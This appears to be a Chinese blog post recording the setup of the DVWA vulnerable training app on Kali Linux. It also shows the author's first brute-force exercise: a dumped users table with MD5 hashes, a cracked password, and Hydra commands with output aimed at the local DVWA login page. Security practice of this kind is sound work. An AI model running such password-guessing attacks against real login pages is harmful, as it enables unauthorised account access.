---
layout: post
title: "DVWA 安装"
date: 2020-06-14 16:01:00 +0800
description: DVWA 安装中遇到的坑 # Add post description (optional)
img: dvwa.png # Add image post (optional)
tags: [Technical] # add tag
---


## 契机

在一个课程上看到了DVWA的使用，想要好好尝试一下，安装过程中遇到了下面的一些问题，记录下来，以免以后忘记。

## 安装XAMPP

DVWA的安装包中附着一个README文件
打开一看，我去还真长...
挑重点一看，官方推荐是哟功能XAMPP来作为网站的服务器。
遂下载
该服务器发布的版本中有Linux的deb安装包，下载之后，直接dkpg -i到Kali Linux上。
呐，Kali Linux呢，可能会报一些依赖问题。就按照报错中提示的解决依赖语句，直接贴在上一次运行的结果后面回车运行，应该就没问题了。

## 部署DVWA和设置数据库

* 把DVWA的官方压缩包解压，文件名更改为dvwa，然后整个丢到/opt/lampp/htdocs里面
* 按README的内容，把config.inc.php.dist更改为config.inc.php
原文（**Please make sure your config/config.inc.php file exists. Only having a config.inc.php.dist will not be sufficient and you'll have to edit it to suit your environment and rename it to config.inc.php.）
* 进入到opt/lampp/文件夹，找到manager-linux-x64.run。右键该文件，选择run选项。启动xmapp应用，在接面的Manage Servers这个tab里，启动Apache Web Server。
* 此时打开localhost/dvwa即可看见设置数据库的页面了
* 在设置数据库之前，确认本机安装了mysql或者mariadb。Kali Linux自带MariaDB，所以我是按照下面的指导进行的设置。使用MariaDB的时候，是不能用root帐号链接数据库的。
* 通过下面命令启动MariaDB：
systemctl start mariadb
* 按照README的说明进行数据库的设置。原文如下：

To set up the database, simply click on the Setup DVWA button in the main menu, then click on the Create / Reset Database button. This will create / reset the database for you with some data in.

If you receive an error while trying to create your database, make sure your database credentials are correct within ./config/config.inc.php. *This differs from config.inc.php.dist, which is an example file.*

The variables are set to the following by default:
```
php
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
$_DVWA[ 'db_database' ] = 'dvwa';
```

Note, if you are using MariaDB rather than MySQL (MariaDB is default in Kali), then you can't use the database root user, you must create a new database user. To do this, connect to the database as the root user then use the following commands:
```
mysql
mysql> create database dvwa;
Query OK, 1 row affected (0.00 sec)

mysql> grant all on dvwa.* to dvwa@localhost identified by 'SuperSecretPassword99';
Query OK, 0 rows affected, 1 warning (0.01 sec)

mysql> flush privileges;
Query OK, 0 rows affected (0.00 sec)
```
You will then need to update the config file, the new entries will look like this:
```
php
$_DVWA[ 'db_user' ] = 'dvwa';
$_DVWA[ 'db_password' ] = 'SuperSecretPassword99';
$_DVWA[ 'db_database' ] = 'dvwa';
```
* 进行好上面的设置之后，在DVWA的页面上点击数据库设置按钮进行数据库设置。

## 登录页面

此时就应该能成功看见DVWA的登录页面了
通过MariaDB中的用户数据库，可以查看DVWA中的用户帐号和MD5加密密码
直接用MD5对加密密码进行解密，即可登录进页面。
gordonb这个用户对应的密码为abc123

```
MariaDB [(none)]> use dvwa
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dvwa]> show tables;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
2 rows in set (0.001 sec)

MariaDB [dvwa]> select * from users;
+---------+------------+-----------+---------+----------------------------------+----------------------------------+---------------------+--------------+
| user_id | first_name | last_name | user    | password                         | avatar                           | last_login          | failed_login |
+---------+------------+-----------+---------+----------------------------------+----------------------------------+---------------------+--------------+
|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | /dvwa/hackable/users/admin.jpg   | 2020-06-13 11:39:19 |            0 |
|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | /dvwa/hackable/users/gordonb.jpg | 2020-06-13 12:11:37 |            0 |
|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | /dvwa/hackable/users/1337.jpg    | 2020-06-13 11:39:19 |            0 |
|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | /dvwa/hackable/users/pablo.jpg   | 2020-06-13 11:39:19 |            0 |
|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | /dvwa/hackable/users/smithy.jpg  | 2020-06-13 11:39:19 |            0 |
+---------+------------+-----------+---------+----------------------------------+----------------------------------+---------------------+--------------+
5 rows in set (0.001 sec)
```
## Brute Force Attack

先玩了一下暴力破解的模块

找到了Kali Linux的密码破解工具箱里有一个叫Hydra的东东，打开是一堆命令行：

研究了半天命令行怎么用，最终琢磨出来下面的命令行：

`-x 6:6:a1` 表示，即时生成6位以小写字母和数字构成的密码，逐个尝试

`127.0.0.1` 自己搭建的服务器地址，应为网站域名

`http-post-form` 帐号密码提交属于这个请求类别

`/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout ^USER^ ^PASS^` 均为占位符，对应前面的用户名和密码


```
hydra -l gordonb -x 6:6:a1 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-14 09:29:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2176782336 login tries (l:1/p:2176782336), ~136048896 tries per task
[DATA] attacking http-post-form://127.0.0.1:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaa" - 1 of 2176782336 [child 0] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaab" - 2 of 2176782336 [child 1] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaac" - 3 of 2176782336 [child 2] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaad" - 4 of 2176782336 [child 3] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaae" - 5 of 2176782336 [child 4] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaf" - 6 of 2176782336 [child 5] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaag" - 7 of 2176782336 [child 6] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaah" - 8 of 2176782336 [child 7] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaai" - 9 of 2176782336 [child 8] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaaj" - 10 of 2176782336 [child 9] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaak" - 11 of 2176782336 [child 10] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaal" - 12 of 2176782336 [child 11] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaam" - 13 of 2176782336 [child 12] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaan" - 14 of 2176782336 [child 13] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaao" - 15 of 2176782336 [child 14] (0/0)
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "aaaaap" - 16 of 2176782336 [child 15] (0/0)
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
...
```
运行之后，程序就开始一行一行猜了，我算了一下，一共6位密码，每一位有36种可能，假设每秒钟可以尝试36组密码，大约需要699.84天（不过我可能大大低估了电脑的算力吧）...天啊...遂把程序停掉...

不过不知道我电脑的算力到底是多少，按照 [这一页的参考](https://tmedweb.tulane.edu/content_open/bfcalc.php?uc=&lc=&nu=&sc=&ran=6&rans=&dict=)，假设算力达到每小时25,769,803,776次，那么304秒就能解决战斗

```
36**6/（25769803776.0/3600）
304.09297943115234 秒
```
大概跑了不到五分钟吧，没耐心，就给关掉了...

用密码试一试，看看破解的界面长什么样好了...

```
kate@Argo:~$ hydra -l gordonb -p abc123 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout" -vV -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-14 09:42:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-post-form://127.0.0.1:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=logout
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 127.0.0.1 - login "gordonb" - pass "abc123" - 1 of 1 [child 0] (0/0)
[VERBOSE] Page redirected to http://127.0.0.1/dvwa/login.php
[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-14 09:42:55

```
看来还是使用常用密码文本破解一下效率会比较高...

[hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)

